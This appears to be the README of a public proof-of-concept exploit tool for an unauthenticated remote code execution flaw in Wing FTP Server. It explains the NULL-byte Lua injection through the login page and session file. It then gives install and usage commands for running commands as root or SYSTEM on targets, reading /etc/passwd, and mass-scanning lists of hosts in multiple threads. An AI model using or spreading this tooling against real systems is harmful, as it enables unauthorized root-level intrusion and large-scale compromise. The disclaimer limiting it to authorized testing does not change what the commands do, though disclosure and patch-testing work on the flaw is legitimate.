```
     ____  _______   ___   __ ____  __  ___ ____
    / __ \|__  /  | / / | / / __ \/  |/  //  _/
   / / / / /_ <| | / /| |/ / / / / /|_/ / / /
  / /_/ /___/ /| |/ / |   / /_/ / /  / /_/ /
 /_____/____/ |___/  |_/  \____/_/  /_/____/
```

# CVE-2025-47812 — Wing FTP Server <= 7.4.3 Unauthenticated RCE

Proof-of-concept exploit for **CVE-2025-47812**, an unauthenticated remote code execution vulnerability in Wing FTP Server versions prior to 7.4.4.

## Vulnerability Overview

| Field | Detail |
|---|---|
| **CVE** | CVE-2025-47812 |
| **Affected** | Wing FTP Server <= 7.4.3 |
| **Type** | Unauthenticated Remote Code Execution |
| **Privileges** | root (Linux) / SYSTEM (Windows) |
| **Vendor** | [wftpserver.com](https://www.wftpserver.com/) |
| **Original Author** | Sheikh Mohammad Hasan aka [4m3rr0r](https://github.com/4m3rr0r) |
| **Modified by** | [d3vn0mi](https://github.com/d3vn0mi) |

### Root Cause

Wing FTP Server's `c_CheckUser()` function truncates the username at a NULL byte (`%00`) for authentication purposes, but the **full unsanitized username** — including everything after the NULL byte — is written into a Lua session file. When an authenticated endpoint such as `/dir.html` is accessed, the server executes that session file, triggering the injected Lua code with elevated privileges.

### Exploitation Flow

```
1. POST /loginok.html
   username=anonymous%00]]<LUA_PAYLOAD>&password=

2. Server authenticates "anonymous" (truncated at NULL)
   but writes full payload into session file → returns UID cookie

3. GET /dir.html  (Cookie: UID=<extracted_uid>)
   Server loads session file → executes injected Lua → RCE
```

## Installation

```bash
git clone https://github.com/d3vn0mi/cve_2025_471812_poc.git
cd cve_2025_471812_poc
pip install requests
```

## Usage

### Quick vulnerability check

```bash
python3 exploit.py -u http://TARGET
```

### Execute a command

```bash
python3 exploit.py -u http://TARGET -c 'id'
```

### Scan multiple targets from a file

```bash
python3 exploit.py -f targets.txt -o vulnerable.txt -t 8
```

### Full options

```
usage: exploit.py [-h] [-u URL] [-f FILE] [-c COMMAND] [-U USERNAME]
                  [-P PASSWORD] [-v] [-o OUTPUT] [-l LOG_FILE]
                  [-t THREADS] [--timeout TIMEOUT] [--retries RETRIES]
                  [--no-verify]

target:
  -u, --url URL           Single target URL (e.g. http://192.168.134.130)
  -f, --file FILE         File containing target URLs (one per line, # comments allowed)

exploit options:
  -c, --command COMMAND   Command to execute on the remote server (enables verbose output)
  -U, --username USERNAME Username for the exploit payload (default: anonymous)
  -P, --password PASSWORD Password for the exploit payload (default: empty)

output:
  -v, --verbose           Enable verbose / debug logging
  -o, --output OUTPUT     Save vulnerable URLs to this file
  -l, --log-file LOG_FILE Write detailed log to this file

network:
  -t, --threads THREADS   Concurrent threads for multi-target scans (default: 1)
  --timeout TIMEOUT       HTTP request timeout in seconds (default: 15)
  --retries RETRIES       Number of retries on connection failure (default: 2)
  --no-verify             Disable SSL certificate verification
```

### Examples

```bash
# Check a single target
python3 exploit.py -u http://192.168.1.10

# Run 'whoami' and see full output
python3 exploit.py -u http://192.168.1.10 -c 'whoami'

# Scan a list with 8 threads, log everything to a file
python3 exploit.py -f targets.txt -t 8 -l scan.log -o vuln.txt

# Use custom credentials with SSL verification disabled
python3 exploit.py -u https://10.0.0.5 -U admin -P secret -c 'cat /etc/passwd' --no-verify

# Verbose mode for debugging
python3 exploit.py -u http://192.168.1.10 -v
```

## Features

- **Structured logging** — Color-coded console output (DEBUG/INFO/WARN/ERROR) + optional file logging via `--log-file`
- **Multi-threaded scanning** — Parallel target scanning with `-t` for large target lists
- **Retry with backoff** — Automatic exponential backoff on network failures (configurable `--retries`)
- **SSL flexibility** — `--no-verify` for self-signed certificates
- **Batch scanning** — Target files support `#` comments and automatic deduplication
- **Clean output** — Vuln-check mode gives a simple VULNERABLE/NOT VULNERABLE result; `-c` shows full command output

## Disclaimer

This tool is provided for **authorized security testing and educational purposes only**. Use it only against systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal. The authors are not responsible for any misuse or damage caused by this tool.

## Credits

- Original exploit by [4m3rr0r](https://github.com/4m3rr0r)
- Modified and improved by [d3vn0mi](https://github.com/d3vn0mi)
